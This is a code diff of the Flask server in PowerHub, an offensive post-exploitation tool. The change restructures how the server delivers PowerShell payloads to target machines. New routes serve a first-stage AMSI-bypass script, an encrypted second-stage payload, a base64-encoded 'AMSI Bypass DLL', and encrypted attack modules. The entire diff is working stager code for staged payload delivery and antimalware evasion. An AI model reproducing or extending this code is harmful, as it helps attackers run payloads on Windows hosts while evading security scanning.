@@ -1,13 +1,12 @@
 from flask import Flask, render_template, request, Response, redirect, \
          send_from_directory, flash
-
 from powerhub.clipboard import clipboard as cb
-from powerhub.stager import modules, stager_str, callback_url, import_modules
+from powerhub.stager import modules, stager_str, callback_url, \
+        import_modules, BASE_DIR
 from powerhub.upload import save_file, get_filelist, upload_dir
 from powerhub.tools import encrypt, compress, key
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
-#  from powerhub.av_evasion import clean_ps1
 
 from datetime import datetime
 from base64 import b64decode, b64encode
@@ -88,34 +87,65 @@ def del_clipboard():
     return redirect('/')
 
 
-@app.route('/ps')
-def payload():
+@app.route('/m')
+def payload_m():
+    if 'm' not in request.args:
+        return Response('error')
+    n = int(request.args.get('m'))
+    if n < len(modules):
+        modules[n].activate()
+        if 'c' in request.args:
+            resp = b64encode(encrypt(compress(modules[n].code), key)),
+        else:
+            resp = b64encode(encrypt(modules[n].code, key)),
+        return Response(
+            resp,
+            content_type='text/plain; charset=utf-8'
+        )
+    else:
+        return Response("not found")
+
+
+@app.route('/0')
+def payload_0():
+    """Load 0th stage"""
     context = {
         "modules": modules,
         "callback_url": callback_url,
         "key": key,
     }
-    if 'm' in request.args:
-        n = int(request.args.get('m'))
-        if n < len(modules):
-            modules[n].activate()
-            if 'c' in request.args:
-                resp = b64encode(encrypt(compress(modules[n].code), key)),
-            else:
-                resp = b64encode(encrypt(modules[n].code, key)),
-            result = Response(
-                resp,
-                content_type='text/plain; charset=utf-8'
-            )
-        else:
-            result = Response("not found")
-    else:
-        result = render_template(
-                        "payload.ps1",
-                        **context,
-                        content_type='text/plain'
-        )
+    result = render_template(
+                    "amsi.ps1",
+                    **context,
+                    content_type='text/plain'
+    )
     return result
+
+
+@app.route('/1')
+def payload_1():
+    """Load 1st stage"""
+    context = {
+        "modules": modules,
+        "callback_url": callback_url,
+        "key": key,
+    }
+    result = render_template(
+                    "payload.ps1",
+                    **context,
+    ).encode()
+    result = b64encode(encrypt(result, key))
+    return Response(result, content_type='text/plain; charset=utf-8')
+
+
+@app.route('/l')
+def payload_l():
+    """Load the AMSI Bypass DLL"""
+    filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
+    with open(filename, 'rb') as f:
+        DLL = f.read()
+    DLL = b64encode(DLL)
+    return Response(DLL, content_type='text/plain; charset=utf-8')
 
 
 @app.route('/u', methods=["POST"])
